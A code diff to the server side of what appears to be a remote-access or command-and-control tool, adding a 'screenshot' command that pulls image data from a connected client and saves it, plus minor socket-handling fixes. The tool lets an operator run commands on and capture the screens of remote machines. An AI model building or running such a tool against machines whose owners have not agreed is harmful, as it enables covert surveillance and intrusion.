@@ -88,6 +88,8 @@ def start_management(client_info):
                     result = b''
                     while len(result) < data_size:
                         chunk = chan.recv(data_size - len(result))
+                        if not chunk:
+                            break
                         result += chunk
                     print(result.decode('utf-8', errors='ignore'), end='')
                     continue
@@ -140,7 +142,31 @@ def start_management(client_info):
                             if not chunk:
                                 break
                             result += chunk
-                        print(result.decode('utf-8', errors='ignore'), end='')
+                        
+                        if command == 'screenshot':
+                            try:
+                                msg_text = result.decode('utf-8', errors='ignore')
+                                print(msg_text)
+                                
+                                file_name = msg_text.split()[1]
+                                save_path = Path(CWD / file_name)
+                                
+                                len_bytes = b''
+                                while not len_bytes.endswith(b'\n'):
+                                    len_bytes += chan.recv(1)
+                                img_size = int(len_bytes.decode('utf-8').strip())
+                                
+                                img_data = b''
+                                while len(img_data) < img_size:
+                                    img_data += chan.recv(img_size - len(img_data))
+                                    
+                                with open(save_path, 'wb') as file:
+                                    file.write(img_data)
+                                print(f'[+] Screenshot saved locally as: {file_name}\n')
+                            except Exception as e:
+                                print(f'[-] Error saving screenshot on server: {e}')
+                        else:
+                            print(result.decode('utf-8', errors='ignore'), end='')
             else:
                 if command == 'exit':
                     chan.send('exit'.encode('utf-8'))
@@ -171,7 +197,7 @@ def handle_client_connection(client_socket, address):
         chan = bhSession.accept(20)
         if chan is None:
             print('[-] No connection.')
-            sys.exit(1)
+            return
 
         sys_info = chan.recv(1024).decode('utf-8').strip()
 
